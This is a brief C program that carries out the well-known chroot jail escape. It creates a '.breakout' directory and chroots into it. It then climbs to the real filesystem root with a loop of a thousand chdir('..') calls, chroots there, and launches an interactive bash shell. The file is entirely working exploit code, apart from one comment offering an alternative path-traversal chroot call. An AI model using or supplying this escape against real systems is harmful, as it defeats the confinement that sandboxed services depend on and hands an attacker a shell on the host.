#include <sys/stat.h>
#include <unistd.h>

int main() {
	mkdir(".breakout", 0755);
	chroot(".breakout");
	// This line also works but it seems more elegant to just use a for loop
	//chroot("../../../../../../../../../../../../../../../..");

	int x;
	for(x = 0; x < 1000; x++){
		chdir("..");
	}
	chroot(".");
	return execl("/bin/bash", "-i", NULL);
}
